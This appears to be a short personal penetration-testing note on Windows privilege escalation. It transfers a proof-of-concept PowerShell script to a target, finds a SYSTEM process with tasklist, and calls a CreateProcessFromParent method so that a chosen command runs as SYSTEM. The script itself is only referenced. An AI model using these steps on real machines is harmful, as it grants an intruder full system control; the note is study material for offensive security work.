Use this to elevate privs

First need to transfer [[Poc Script]] to target machine
Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`

Need to find task that is running as SYSTEM
```
tasklist
```
	![[Pasted image 20241010131911.png]]
Next run script
```
.\scipt.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
![[Pasted image 20241010132352.png]]
